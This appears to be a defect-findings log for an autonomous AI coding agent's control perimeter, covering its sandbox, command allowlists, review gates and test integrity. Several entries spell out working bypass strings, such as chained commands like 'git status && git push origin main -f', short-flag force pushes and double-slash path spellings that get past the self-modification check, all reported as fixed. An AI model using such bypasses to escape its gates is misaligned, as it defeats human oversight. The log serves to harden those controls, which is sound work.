notes: Found by the defect hunt against the gate added in the SAME session by ORPHAN-HIGH-339, and reproduced independently: STATE_SURFACES declares 160 surfaces while covered_tool_ledgers returns a small subset (4 in a bare tree, ~28 with conditional files present). Uncovered surfaces include enterprise_acceptance_events, autonomy_state, cost_attribution, cost_budget, cost_telemetry and handoffs. A cycle killed mid-append to any of those still yields integrity verify status=ok, so state_valid=true and the damaged tree is uploaded under the canonical aria-tools-state with overwrite:true, destroying the last good copy; the next run restores it as authoritative. The ORPHAN-HIGH-339 gate is therefore a real improvement over an unconditional upload but is NOT yet the full guarantee its commit message implies.

title: The daily report PR can never be staged: .gitignore excludes the parent directory, so git add exits 1 and no daily chain-tip anchor has been committed since 2026-05-08
rule_violated: A negation cannot re-include a file whose parent directory is excluded; an audit anchor that exists only inside an expiring CI artifact is not an audit anchor.
notes: Independently reproduced: git check-ignore -v aria-tools/reports/daily/2026-07-26.md prints .gitignore:13:aria-tools/ with rc=0, proving the negations at .gitignore:229-230 are inert, and git add --dry-run on that path exits 1. git ls-files aria-tools/reports/daily confirms the last committed anchor is 2026-05-08.md. The generate-report job still succeeds and uploads a 365-day artifact, so the workflow looks half-green while every governance chain-tip anchor since May exists only in an expiring artifact.

title: The kernel test suite inherits the agent container's global git config, so every fixture commit invokes an external signing binary and the suite can redden for reasons unrelated to the code under test
rule_violated: A test suite that gates every stage of an autonomy programme on 'suite green' must not have a verdict that is a function of machine state; a fixture repository must be hermetic with respect to ambient configuration.
notes: Reproduced from primary evidence: git config --global resolves commit.gpgsign=true, gpg.format=ssh, gpg.ssh.program=/tmp/code-sign, and /tmp/code-sign is a symlink to /opt/env-runner/environment-manager — the agent harness's own binary. A bare 'git init' in a temp directory resolves commit.gpgsign=true and gpg.ssh.program=/tmp/code-sign, so every fixture commit in roughly thirty test files that build repos inline invokes that external program. Under concurrent agent load three fixtures failed with 'git commit' exit 128 (tests/test_evidence_trust.py:50, tests/test_executor_lane.py:34) and all 33 passed on an isolated re-run — a failure signal produced by harness availability, not by the code under test. This matters beyond flakiness: every stage gate in docs/plans/2026-07-26-aria-software-team-program/PLAN.md exits on 'suite green', so an unreliable suite is the same defect class as the dashboard that reported 21 blocked cycles as ok.

title: The test_gate_canonical_suite policy named mutation and coverage gates that do not exist in this repository, so the declared canonical suite could never have been satisfied
rule_violated: A gate must be satisfiable by the repository it governs. Requiring a validation target that has no implementation produces a check that can only ever be bypassed, which is worse than no check because it reads as coverage.
notes: Found while implementing ORPHAN-CRITICAL-343 phase A. The HARD_FAIL_CHECKS entry for test_gate_canonical_suite described the canonical suite as 'nx affected, type-check, mutation, coverage'. package.json has no mutation-testing script (no stryker, no mutation target) and no coverage script or nx coverage target; the only test/lint/type targets are 'nx affected --target=test', 'nx affected --target=lint' and 'npm run type-check'. Because the check had no implementation, the mismatch was invisible: the entry bound _not_implemented and failed for that reason instead. The check is now implemented against the three commands that exist, and the registry description is corrected to say so rather than silently narrowing. What remains open is the real gap: this platform has no mutation-testing and no coverage-threshold gate at all, so an implementation can declare the full canonical suite and still ship untested branches. Closing this finding means adding those targets to the repo and then extending CANONICAL_VALIDATION_COMMANDS, in that order.

title: The hard-fail perimeter is one undifferentiated gate, so the five implemented checks are unreachable and draft-PR capability cannot be unlocked without also unlocking merge
rule_violated: A perimeter that guards two different stages must be selectable per stage; otherwise the strictest unbuilt check makes every implemented check unreachable, and a working perimeter is indistinguishable from an empty one.
notes: HARD_FAIL_CHECKS was a single set of 17 entries. Any caller that ran it also ran the twelve entries bound to an explicit failure, so the five real implementations could never produce a passing report. That made a working perimeter indistinguishable from an empty one, and it meant draft-PR capability could not be granted without also granting merge. Splitting by gate stage (GATE_PRE_PR_OPEN / GATE_PRE_MERGE) makes the pre-PR-open gate satisfiable while merge stays closed by construction, and HardFailCheck.gate defaults to pre_merge so an unclassified check lands in the stricter gate rather than silently widening the weaker one.

title: Five declared pre-PR-open hard-fail checks have no implementation, including the short-form hook bypass the argv denylist cannot see
rule_violated: A named check in a security perimeter must resolve to a callable that inspects the pending action; a declared name bound to a placeholder is a gap that reads as coverage.
notes: no_force_push, no_no_verify, kernel_self_modification_blocked_at_envelope_mint, test_gate_canonical_suite and pr_body_templating were names bound to a placeholder that failed. Two are not the duplicates they appear to be: the mint check is purely lexical over the envelope's declared affected_surfaces, which is why it works before a workspace exists, while forbidden_scope_normalized resolves real paths and returns workspace_root_absent at that point. no_no_verify earns its place beside DENIED_BASH_COMMANDS by catching 'git commit -n' -- the denylist matches only the literal --no-verify string. Also surfaced while implementing: the declared canonical validation suite named mutation and coverage targets that do not exist in this repository, so that check could never have passed; tracked separately.

title: No sandbox backend is installed on any runner, so write containment refuses every write-capable spawn and ARIA cannot execute an implementation at all
rule_violated: A fail-closed containment layer is only a containment layer if the thing it contains can still run; with no backend present the same code path is indistinguishable from a hard disable, and the stage that depends on it cannot be entered.
notes: sandbox_backend() returns bwrap, firejail or None (implementation_safety.py:463-473) and claude_runtime._apply_write_containment refuses a write-capable spawn when it is None. Verified: grep across .github/workflows finds no step that installs bubblewrap or firejail, and neither binary is present in the development container either, so sandbox_backend() is None everywhere the kernel runs today. The consequence is not a weaker perimeter, it is no execution: the moment the real implementation runner replaces NoOpV9ImplementationRunner on the scheduled path, its spawn is refused and the cycle produces nothing. This also means stage S0's own stated exit criterion -- 'sandbox_backend() non-None on the runner' -- was never met, and the plan recorded S0 as exited anyway; that record is corrected in the same commit. Closing this finding means installing a backend in the runner image or workflow and asserting sandbox_backend() is not None from a CI step, so the absence fails a gate rather than silently disabling the implementer.

title: The observe burn-in rejects any porcelain output, so the kernel's own runtime writes make the only producer of ladder evidence unstartable
rule_violated: Two guards over the same question must share one definition; and a gate must not reject the evidence the gated process exists to produce.
notes: burn_in._require_clean_worktree raised on ANY git status --porcelain output, with no runtime-path exemption, while worktree.preflight over the same tree already excluded aria-tools/, .aria-poc/, aria-findings/, aria-debts/ and agent-workspace/ via KERNEL_RUNTIME_PATH_PREFIXES. One tree, two contradictory definitions of clean. The concrete failure: once the .gitignore descent fix made aria-tools/reports/daily/*.md trackable, reflection writes that file every cycle and aria-auto-cycle unzips the prior night's state into the workspace, so the next mode=burn-in-observe dispatch died with observe_burn_in_pre_worktree_not_clean and produced zero ladder evidence. Since L1 requires 30 observe_successes and the burn-in is their only producer, this closes the autonomy ladder at rung zero. CI cannot see it because CI points the kernel at .aria-ci/tools. Fixed by importing worktree.is_runtime_path rather than restating the prefix tuple, so the two guards cannot drift again. Regression test proven to fail before the fix with the exact error.

title: Four high-severity advisories block the required security-audit check after an advisory-database update, one of them needing a semver-major native dependency bump
rule_violated: A required merge gate that depends on an external, continuously-updated advisory database will go red without any change to the repository; the dependency floor must be raised rather than the gate lowered.
notes: Not caused by any change in this branch: package.json and package-lock.json are byte-identical at base bdaf00bf and at the branch head that first went red, and an earlier run on the same lockfile passed this step. The trigger is the live advisory DB — brace-expansion <=5.0.7 (two DoS advisories), fast-uri 3.0.0-3.1.3 (host confusion; the new range swallowed the repo's own existing ^3.1.2 override), postcss <=8.5.17, and sharp <0.35.0. brace-expansion and postcss are transitive only, so overrides are the mechanism. sharp is a direct dependency whose only fix is 0.35.3, a semver-major bump of a native libvips binding, so it was verified rather than assumed: npm run type-check is green across all 40 projects and the two sharp-consuming suites pass (media-finalization 4/4, file-upload-security 10/10). sharp 0.35 moved its types behind `declare namespace sharp` with `export = sharp`, so the default import is a value binding only and `keyof sharp.FormatEnum` stopped resolving in thumbnail.service.ts; that is fixed with a named type import and no runtime change. Eight moderate advisories remain and are below the gate's threshold; --audit-level was NOT lowered.

title: The commit-msg traceability hook is installed only by husky's prepare script, which the repo's own mandated --ignore-scripts install never runs, so the gate binds for nobody locally
rule_violated: A control whose only binding is a lifecycle script that the project's own install procedure disables is not a control; it is documentation that happens to be executable.
notes: Found by asking why the same mistake happened three times in one session rather than treating it as carelessness. package.json declares prepare: husky install and no postinstall and no explicit installer; 19 workflows run npm ci --ignore-scripts for supply-chain hygiene (SEC-CI-007), which is also the documented install for contributors. So prepare never executes, core.hooksPath stays unset, .git/hooks/commit-msg is absent, and the hook that enforces CLAUDE.md's Review Finding Traceability rule never runs on any developer machine that follows the repo's own instructions. Verified in this clone: git config --get core.hooksPath was unset and .git/hooks/commit-msg absent, while .husky/commit-msg exists and is executable; running it by hand against a fix(gates) message with no trailer exits 1 with the exact violation CI later reported. Consequence: the only real enforcement is the closes-footer-check workflow, which runs minutes-to-hours after the commit is written and, because it validates the whole PR range, cannot be satisfied by a follow-up commit -- a missing trailer on a pushed commit is unrepairable without rewriting history, which this repo forbids. The tier ceiling is honest: a repository cannot force a developer's local git config, so this is fixed at tier 2 (a one-command installer) plus tier 3 (an invariant that the hook exists, is executable, and has an install path independent of prepare), not tier 1.

title: A type: ignore suppression was added on the Gate C consolidated verdict, silencing the one check that constrains the value deciding whether the specialist gate blocks
rule_violated: CLAUDE.md Code Quality Standards bans as any / @ts-ignore / @ts-expect-error; the Python analogue is # type: ignore. A suppression on a value that feeds a merge-affecting gate hides exactly the class of defect the annotation exists to surface.
notes: Self-audit of this branch, not an inherited defect: the kernel carried 19 # type: ignore comments at base bdaf00bf and 20 at branch head, and the single added one was mine. SpecialistReviewResult declares consolidated_verdict as an inline four-value Literal, while verdict was assigned in an if/elif/else and therefore inferred as str, so the TypedDict construction did not type-check and the suppression made it quiet. The right shape was available and cheap -- Literal was already imported at line 47. Fixed by naming the union as ConsolidatedVerdict, using the alias in the TypedDict, annotating verdict at its assignment site, and deleting the suppression; mypy 1.19.1 reports zero errors for this module afterwards. Registered rather than silently amended because a suppression added while closing an audit is the exact thing an audit is supposed to catch.

title: The Gate C block policy is a denylist, so an unrecognised specialist verdict is treated as a clean review and the cycle proceeds to worker_drainer on an unreviewed domain
rule_violated: A gate that enumerates what fails and passes the remainder inverts its own default: every value it has not anticipated becomes an approval. Gates must enumerate what passes.
notes: Found while fixing ORPHAN-MEDIUM-442 -- removing the suppression forced the question of what the untyped boundary actually admits. specialist_verdict_blocks_cycle returned True for consolidated_remediation_required and consolidated_judge_split, True for specialists_unavailable outside the observe profile, and False for everything else, so any string it did not recognise was indistinguishable from consolidated_no_gaps. The boundary is genuinely untyped in production: specialist_review_runner is an injected kwarg behind a Protocol, and autonomy_orchestrator:1489 reads the verdict with dict.get(), so a typo, a renamed verdict, or a row written by a newer build all arrive as an arbitrary string. This is the same inversion ORPHAN-HIGH-423 fixed one case of: 423 stopped standard and autonomous from failing open on specialists_unavailable, but left the wider default untouched. Fixed by inverting the shape into an allowlist -- consolidated_no_gaps is the only value that returns False; the always-blocking pair still blocks in every profile including observe; everything else, known-unsatisfiable or unrecognised alike, blocks in every write-capable profile. Regression test I-GATE-08b covers five unknown values across three write-capable profiles and fails 15/15 subtests against the pre-fix body.

title: The debt-plan repin script wrote all three mirror files before refusing on a changed CRITICAL id list, contradicting the docstring and commit message that said it stops instead
rule_violated: A refusal that runs after the side effects it was meant to prevent is not a refusal, and a docstring asserting otherwise makes the defect harder to see than no docstring at all.
notes: Self-audit of this branch. The script was introduced in cfec3241c with a docstring promising that a changed active_critical_ids list makes it say so and stop rather than silently produce an inconsistent manifest, and the commit message repeated the claim. The code did the opposite: writeFileSync ran for manifest.json, finding-truth-table.md and README.md, and only then did the id comparison reach process.exit(1). A refused run therefore left three modified files with the counts repinned and the id list stale -- precisely the inconsistent mirror the docstring said it prevented. Fixed by hoisting the comparison to a top-level precondition guard ahead of every write. Verified behaviourally rather than by reading: with the manifest perturbed to drop one id and to carry a wrong registry_entries value, the script exits 1 and md5sum -c confirms all three files byte-unchanged, including the wrong count it would previously have rewritten; on a clean tree it still reports already current and exits 0.

title: The ARIA authority hash in CURRENT_STATE had a checker and no writer, so refreshing it meant copying a value out of a Jest failure by hand
rule_violated: A derived value with an automated checker and a manual producer will go stale; the checker then reports the staleness as a failure of the change that happened to notice it.
notes: docs/aria/CURRENT_STATE.md carries a Last verified ARIA authority hash line digesting every tracked file under docs/aria/, aria-kernel/, tools/aria-poc/ and the aria-* workflows -- the mechanism that makes the document falsifiable rather than aspirational. aria-doc-runtime-ssot.spec.ts recomputed and compared it, but nothing produced it: the documented refresh procedure was to read the expected value out of a failing assertion and paste it in. Structurally identical to the debt-plan manifest before ORPHAN-MEDIUM-444's script, and it failed the same way -- any kernel edit reddened an unrelated spec with a message that reads like a broken test rather than a stale document. Fixed by extracting the digest into tools/gates/aria-authority-hash.ts with a --write mode (npm run aria:authority-hash:write) and having the spec IMPORT that module rather than keep a private copy, so a writer that disagrees with the checker is not expressible. Verified: the writer moved 65f80ec4 -> 6a3b4251, a second run reports already current, and the spec passes 16/16. The digest is a fixed point because the hash line itself is normalised to a sentinel before hashing, so writing the value back does not invalidate it.

title: The convergence independence gate never receives the cross-reviewer's text, so the diversity layer computes neither comparison it exists for and every converged verdict is downgraded
rule_violated: A commit that claims a control is now functional must demonstrate the control firing on production-shaped inputs; asserting the layers in isolation while the caller feeds one of them a literal None is a claim without evidence.
notes: Self-audit of this branch, and the most serious defect it introduced. ORPHAN-HIGH-421 was closed under the title 'make all three convergence independence layers functional'. Layers 1 and 2 became functional; layer 3 did not. convergence_drainer records the round's role-to-dispatch map immediately after minting the cross-review envelope -- before the reviewer has run -- and passed agent_text=None as a literal, with nothing refreshing the record once the review landed. independence_check._diversity_reasons short-circuits on {role}_text_unavailable whenever either side lacks text, so both comparisons the layer exists for (primary-cross_review and challenger-cross_review) were never computed in any production round. Verified empirically, not by reading: with drainer-shaped inputs, verify_independence returns passed=False with reasons ['claims_jsonl_missing', 'cross_review_text_unavailable']. The consequence is worse than a no-op -- convergence_drainer downgrades on not independence_ok, so no plan could hold a converged verdict and the convergence stage terminated in cross_review_self_agreement forever. Before the change the layer was a vacuous pass; after it, a vacuous fail plus a capability regression hidden behind a 'now functional' claim. Fixed by re-recording the cross_review dispatch with the reviewer's real output after the CROSS_REVIEWED poll succeeds, reading it through accepted_result_for_request so an undelivered review stays a violation rather than an assumption; the reader returns None and never an empty string, because RoundDispatch fails closed on None while '' would score as maximally diverse and pass. Eight regression tests, including one asserting the pre-fix shape so the file cannot pass vacuously and one proving a reviewer that parrots the primary is still caught by the Jaccard ceiling. Found by an independent adversarial lens, not by the suite: grep for round_dispatch across aria-kernel/tests returned zero hits, so nothing covered the drainer's wiring at all.

title: The two tests pinning the specialist gate carry silent skip escape hatches, so they can stop asserting without turning red
rule_violated: A regression test that skips itself when its own precondition is unmet reports green for a run in which it asserted nothing; a gate test must fail when it cannot exercise the gate.
notes: Self-audit of this branch. I-GATE-06 and I-GATE-07 are the two cases that pin ORPHAN-HIGH-423, and both ended with `if not result['specialists_dispatched']: self.skipTest(...)`. These were the only skip markers this branch added. The fixture pins the input -- touched_services is ['apps/auth-service/'], which _DOMAIN_TOUCH_MAP maps to two specialists -- so the guarded condition is not a legitimate environmental variance; it is the case where the gate under test was never exercised, which has to be red rather than green-with-an-asterisk. Replaced both with assertTrue on the dispatch list. Found alongside it, in the same file: two `# type: ignore[arg-type]` comments suppressing an error code mypy does not even raise here. The real error is `return-value` -- both helpers were annotated `-> dict` while returning a TypedDict -- and it went unreported only because nothing runs mypy over aria-kernel/tests. Annotating the helpers with their true return types (ReviewResult, SpecialistReviewResult) removes both suppressions and immediately surfaced five further latent errors from indexing a `dict | None` after assertIsNotNone, which is not a TypeGuard; those are now narrowed with a bare assert. The type annotation started doing work the moment it stopped being `dict`.

title: The debt-plan repin script silently no-ops on anchor drift and still exits 0, and as a .mjs file it sat outside the only type-check surface its directory has
rule_violated: A mirror-refresher that cannot fail converts drift into confidence: it reports success for a run in which it refreshed nothing.
notes: Second self-audit pass over the script ORPHAN-MEDIUM-444 already corrected once. Three further defects. First: repinManifest threw on a missing anchor while repinTruthTable and repinReadme returned a boolean the caller discarded, so a renamed README bullet or a truth-table that no longer quoted the tip hash made the script print success and exit 0 having repinned nothing. Second: making those throw is only half a fix, because throwing on the third file after writing the first two reproduces 444's write-before-refuse bug in a new order -- so the three functions are now pure planners that read, validate every anchor, and return the bytes they would write, with nothing reaching the filesystem until all three succeed. Verified by renaming a README bullet and confirming exit 1 with all three files byte-unchanged under md5sum -c. Third: tools/gates/tsconfig.json includes **/*.ts, so the one executable gate script written as .mjs was the only one in the directory that nothing type-checked; converted to TypeScript and run through ts-node like every sibling gate, which also replaced the untyped registry parsing with declared RegistryEntry and RegistryState interfaces.

title: The ARIA authority-hash writer computed its digest from the git index, so running it before staging a new kernel file wrote a value the commit could not match
rule_violated: A generator whose output depends on staging order will silently produce a value the commit contradicts; the dependency must be refused, not documented.
notes: Caught by CI, not by me, one commit after ORPHAN-MEDIUM-445 introduced the writer -- so the fix for a stale-mirror defect shipped with a fresh instance of the same class. The digest is defined over `git ls-files`, which reads the index. Running `npm run aria:authority-hash:write` while a new aria-kernel test file was still untracked computed the hash over a file set that excluded it; `git add -A` then brought the file in, and the committed tree hashed differently. aria-merge-authority and invariants-fast both went red on head 63e4563ed with expected 13fb3632 against recorded 6dcc7a99, and both had been green on the previous head. Local validation could not have caught it: every local run was against the same dirty index that produced the wrong value. Fixed by making the writer refuse when `git ls-files --others --exclude-standard` reports anything under docs/aria, aria-kernel or tools/aria-poc -- the same expression tools/quality/format-scope.json uses to answer what the commit will contain -- with a message naming the files and telling the operator to stage them first. Verified by touching an untracked file under aria-kernel/tests and confirming the refusal, then removing it and confirming the writer produces the value CI computes.

title: The HUMAN_REQUIRED adjudication panel that closed ORPHAN-HIGH-426 has zero production callers, so escalations are still raised every cycle and cleared by nobody
rule_violated: A control is the code that runs it. Implementing a 498-line panel and never calling it leaves the observable behaviour identical to the defect it was written to fix.
notes: Claimed by an independent adversarial lens and confirmed mechanically: grep for importers of human_required_adjudication across aria-kernel/ and tools/, excluding aria-kernel/tests/, returns nothing; the only two importers are test files. The module is correct in isolation -- independent three-agent panel, principal-disjointness verification against the claims ledger, a closed irreducible class, fail-closed quorum where one insufficient_evidence blocks -- and none of it ran. cycle.py:476 and :487 execute the two sweeps that CREATE escalations on every cycle, and nothing acted on them, so after the fix an escalation still waited for a person exactly as ORPHAN-HIGH-426 described. This is the audit's own subject reproduced inside the fix for one instance of it, which is why it is registered separately rather than folded into 426. Fixed by adding sweep_human_required_adjudications() and calling it from cycle.py immediately after the two creating sweeps, under the same shadow/discovery guards, with its result surfaced in the cycle summary. Three properties make it safe to run every cycle and each is pinned by a test: reachability from run_cycle, asserted against the module object rather than source text; idempotence, asserted over five consecutive sweeps of an escalation whose panel never delivers -- the exact case that would otherwise mint a fresh three-envelope panel and a new ledger row every cycle forever, because open_adjudication is not idempotent; and skipping rather than attempting the irreducible class, verified across profile_transition, credential_mint, merge_authority, an unadmitted future kind, and a context-free record, none of which mint anything.

title: The firejail sandbox backend applied none of the READONLY_PATHS while satisfying the S0 containment exit criterion, and the operator-facing refusal message recommended installing it
rule_violated: A backend that clears a containment gate without enforcing the property the gate exists for is worse than no backend: a refused spawn is honest, a false green is not.
notes: Found by a 13-agent adversarial audit of this branch's own work; confirmed from source. wrap_bash_in_sandbox has two branches. The bwrap branch ro-binds the system roots plus every existing READONLY_PATHS entry, so a write under them gets EROFS at the syscall level -- the property ORPHAN-CRITICAL-427 was written to establish. The firejail branch was ['firejail','--quiet','--private-tmp',f'--whitelist={workspace}'] plus an optional --net=none: zero of the eighteen READONLY_PATHS, with the workspace whitelisted and therefore writable, including aria-kernel/aria_kernel/ itself. sandbox_backend() returned 'firejail' for it, callers treat a non-None return as proof containment is in force, and PLAN.md makes sandbox_backend() non-None the S0 exit evidence -- so choosing firejail satisfied the exit criterion for containment with the kernel fully writable. The claude_runtime refusal message actively told the operator to 'install bwrap or firejail', so the documented remedy led straight to the hole. Fixed by removing firejail as an accepted backend entirely rather than adding --read-only flags: firejail can be made to enforce this, but it cannot be verified in this environment, and shipping an unverified security control is the defect being closed. The refusal message now names bwrap only and states that installation alone is insufficient without unprivileged user namespaces. Four regression tests, all failing pre-fix.

title: The bwrap capability probe did not mirror the wrapper, in violation of the comment directly above it, so it could report available on a host where every spawn dies
rule_violated: A requirement expressed only as a comment is not enforced; if two argvs must match, they must be built from one definition.
notes: The comment above _BWRAP_PROBE_ARGV said verbatim: 'The probe argv MUST mirror wrap_bash_in_sandbox: same ro-binds ... A probe that exercises less than the wrapper can pass while the wrapper fails.' They had already drifted when it was written. The probe bound /usr /lib /lib64 /bin; the wrapper additionally emitted --ro-bind /etc/alternatives and --ro-bind /etc/ssl UNGUARDED -- the READONLY_PATHS loop below them is full.exists()-guarded, those two were not. On a runner image lacking either directory the probe reports available, sandbox_backend() returns bwrap, and every write-capable spawn then dies at invocation, which is ORPHAN-CRITICAL-439's failure mode relocated to a place where it is harder to diagnose. Fixed by extracting _SANDBOX_SYSTEM_ROOTS and a _system_ro_binds() helper that applies the same existence guard, consumed by both the probe and the wrapper, so the divergence the comment warns about is no longer expressible rather than merely discouraged. Pinned by a test that diffs the wrapper's system binds against the probe's.

title: The declared-path normalizer collapsed only leading ./ and outer slashes, so an interior double slash walked a kernel path past the self-modification check
rule_violated: A path comparison that normalizes some spellings and not others is a denylist of spellings; the equivalence class must be collapsed completely.
notes: _normalize_declared_path did `while text.startswith('./'): text = text[2:]` then `.strip('/')`, so interior // and /./ survived untouched. _check_kernel_self_modification_at_mint compares the normalized surface against READONLY_PATHS prefixes, so `aria-kernel//aria_kernel/cli.py` did not match `aria-kernel/aria_kernel/` and passed -- a one-character edit defeated the mint-time kernel self-modification gate. Executed against the real check before fixing. Fixed by reconstructing the path segment-wise: split on /, drop empty and '.' segments, rejoin. That collapses the whole equivalence class rather than adding one more special case. '..' is deliberately PRESERVED so the caller's explicit traversal rejection still fires; silently resolving it would turn a traversal attempt into a clean-looking path. Pinned by eight spellings through the normalizer and six through the end-to-end mint check, plus a negative test that a legitimate docs/ surface still passes.

title: The force-push check read push_refspecs and never bash_argv, while the bash allowlist for git push admits trailing flags, so `git push origin aria-impl-<sha> -f` passed the whole perimeter
rule_violated: Enforcing an absolute prohibition on one of the two ways to express it is not enforcing it.
notes: Three layers each missed it. ALLOWED_BASH_COMMANDS pins the push branch with a pattern ending in (\s+\S+)*, which admits a trailing flag. DENIED_BASH_COMMANDS carried --force, --force-with-lease, --no-verify and core.hooksPath but no short form. _check_no_force_push does test for '-f' -- but only against context.push_refspecs, never against context.bash_argv -- so an action expressing its push as a bash command reached the gate with nothing examining it. CLAUDE.md forbids force-push absolutely. Fixed at the argv level rather than by regex over the joined command string, because token-wise matching is what makes clustered short flags (-fu, -uf) and a leading + refspec decidable without also rejecting a filename containing -f: _argv_forces_a_push inspects tokens after `git push` and _check_no_force_push consults it before the refspec arm. A companion deny pattern scoped to `^git\s+push` covers the string-matching path. Deliberately NOT a global short-flag denial: -n is --no-verify on git commit but a count on git log and --dry-run on git push, so a blanket pattern would refuse `git log -n 5`, and a denylist that refuses safe commands gets routed around. Seven force spellings pinned, five safe commands pinned as still permitted.

title: Three headline fixes had no regression coverage at their production callsite, and the one test claiming to cover a callsite patched a function and then called the thing it had just patched
rule_violated: Extracting a helper so it becomes testable and then testing only the helper leaves the wiring unpinned; the suite then reports green for a build with the fix removed.
notes: The load-bearing result of a 13-agent adversarial audit, proven by execution rather than argument. Extracting the branch to a scratch repo and replacing autonomy_orchestrator.py, convergence_drainer.py and cycle.py with their base bdaf00bf versions left the full 2805-test suite reporting OK with zero failures, while positive controls on the same harness confirmed it detects real reverts (circuit_breaker.py reverted -> 5 errors; burn_in.py reverted -> 1 error). So ORPHAN-HIGH-421, ORPHAN-HIGH-423 and ORPHAN-HIGH-424 could all silently regress, and three commit messages claiming 'verified red before the fix' were true of the extracted helpers and false of the wiring. The single test that claimed otherwise, test_i_gate_09_orchestrator_delegates_the_block_decision, saved specialist_verdict_blocks_cycle, patched the module attribute with a recording wrapper, called the thing it had just patched, and asserted the wrapper recorded the call -- the orchestrator was never imported, while the docstring said 'A behavioural check that the orchestrator honours the policy'. Fixed by driving run_autonomy_orchestrator through its real specialist gate with an injected runner: specialists_unavailable must block under standard, and an unrecognised verdict must block too, with a positive control proving a clean verdict still passes so the two cannot pass for the wrong reason. Verified by reverting autonomy_orchestrator.py AND specialist_review_runner.py to base, which now produces 4 failures where the pre-fix suite produced none. The tautological test is replaced by an ast-based assertion that the delegation import still exists -- a claim it can honestly make.

title: The bounded cycle summary is a closed literal that deletes the two keys the publisher reads, so the lifecycle-unreadable warning and every cycle-level suppression marker were unreachable in production
rule_violated: A closed dict literal between a producer and a consumer is a contract; a key the consumer reads and the literal omits is a feature that cannot execute.
notes: The remaining holes in ORPHAN-HIGH-424, found by adversarial audit. cycle.py:693 produces a cycle_lifecycle snapshot; runtime_artifacts.py:804 reads cycle.get('cycle_lifecycle') to raise the cycle_lifecycle_unreadable warning -- the distinction between 'zero incomplete cycles' and 'the cycles ledger could not be read' that the 424 commit message sells as the feature. Between them sits _bounded_cycle_summary, a closed ten-key literal that names incomplete_lifecycle_count and NOT cycle_lifecycle, so the key was deleted one call after it was produced and the warning could never fire in production. The same literal drops the cycle-level suppression and truncation markers that runtime_artifacts sums, so those too were structurally incapable of being non-zero at cycle level. The tests passed because they asserted on the raw cycle dict, a shape production never emits -- the same defect one layer down. Additionally the exception path built its own six-key literal with no counter at all, and a crashed cycle is exactly the one likely to have left a started-without-terminal row. Fixed by passing the snapshot through with incomplete_cycles capped at 20 while still reporting the true incomplete_count so the cap cannot hide scale, mirroring the marker key names with a drift test, and having the exception path emit valid:false with an explicit read error rather than a zero that reads as 'nothing incomplete'. Five regression tests; reverting the literal produces 3 failures and 1 error.

title: The explicit-append path was blind to the markdown orphan store and compared full id strings, so the exact ID collision that forced this branch to be retraced was still reachable through the other door
rule_violated: Fixing one of two code paths that must agree leaves the defect reachable; the agreement has to be structural, through a single shared reader.
notes: ORPHAN-HIGH-417 taught the ALLOCATOR to read docs/reviews/orphan-findings.md alongside the registry, and left appendExplicitFinding reading the registry alone. An adversarial verifier drove the exported function directly and it ACCEPTED ORPHAN-MEDIUM-416 -- a live heading in the markdown store -- returning 0. Two independent bugs, and the second is why my own first attempt at this fix silently did nothing: orphanMarkdownReservedIds normalizes to ORPHAN-RESERVED-NNN because a markdown heading records no severity, and the classifier segment varies with severity anyway, so a full-string comparison of ORPHAN-MEDIUM-416 against ORPHAN-RESERVED-416 never matches. The SEQUENCE is the identity. I discovered this by running my own proof against the real registry rather than a copy, which appended a colliding row to the live hash chain; the row was the last line, so it was removed and `npm run findings:verify` confirms the chain valid at 1074 entries with the tip unchanged -- recorded because a fix attempt that mutates the SSoT is exactly the kind of thing that should not be quietly reverted. Fixed structurally: claimedIdsForDomain() is the one store-reader both append paths use, and claimedSequences() is the one sequence extractor shared by nextFindingId and the explicit collision check, so a third append path added later inherits every store by construction. Verified against an ISOLATED registry copy: exit 1, the copy still three rows, and the error names the sequence and all three stores.

title: The executor sandbox-contract invariant matched raw workflow text, so a YAML comment satisfied it and the real verification step could be deleted with the gate still green
rule_violated: A gate satisfied by prose about the gate asserts nothing; text-matching contracts must read what executes, not what the file says about itself.
notes: Proven by execution, not by reading. A verifier copied .github/workflows, tools/aria-poc and the contract test into a scratch root, confirmed a 3-test baseline OK, then deleted lines 280-301 of aria-agent-executor.yml -- the entire 'Verify the sandbox actually confines' step and its comment block -- and re-ran: still OK. _ASSERT_PATTERN is re.compile(r'sandbox_backend\s*\(') matched against the whole file, and a comment forty lines earlier at :270 contains the words sandbox_backend(). So I-SBX-02 was satisfied by a comment, and the step it exists to require could be removed without the gate noticing. This is the failure mode the file itself exists to prevent, one level up. Fixed by stripping comment-only lines before matching -- line-level rather than a YAML parse on purpose, because an inline trailing comment sits on a line that IS executable and dropping the whole line would lose the command. A self-check subtest now asserts that a synthetic workflow whose only mentions are inside comments fails BOTH patterns, and that a real command with a trailing comment still counts, so the gate cannot regress to comment-satisfiable and the strip cannot over-reach.

title: apply_resource_limits had zero production callers, so a write-capable agent spawn was bounded by nothing but a line of prose in the agent's own instruction file
rule_violated: A limit that only an instruction file asks for is not a limit; the spawner must apply it, for the same reason the spawner applies containment.
notes: ORPHAN-CRITICAL-427's registry title names TWO symbols and only one was wired. A repo-wide grep for apply_resource_limits returns exactly four hits: its definition, its __all__ export, a name-pinning test, and .claude/agents/aria-implementer.md:89 -- the prose file the finding condemns, addressed to the very process being limited. run_claude_exec applied _apply_write_containment and no resource limits at all, so a fork bomb or runaway allocation in a write-capable agent was unbounded. 427 was nonetheless credited whole in its trailer (twice), in PLAN.md and in the truth table. Fixed by applying the limits at the spawn site, OUTSIDE the sandbox wrapper so timeout/systemd-run own the whole process tree including bwrap, and with the CALLER's timeout_seconds rather than the helper's 120-second default -- an agent run is minutes and the default would kill every real invocation. Import failure raises rather than proceeding, mirroring containment: a kernel that cannot be imported means the perimeter cannot be applied. Three tests: the original argv survives as the tail so limits wrap rather than replace, the caller's timeout reaches the limiter, and an ast check that containment is applied before limits so the ordering cannot silently invert. The implementer's own validation-command path remains prose-enforced and is part of the still-OPEN ORPHAN-CRITICAL-428.

title: Any forbidden command chained after an allowed prefix passed the bash allowlist, the denylist and the force-push check, so `git status && git push origin main -f` was permitted
rule_violated: An allowlist that reasons about a single command must first establish that it has been given a single command; a pattern ending in a match-anything group admits the shell operators that make it several.
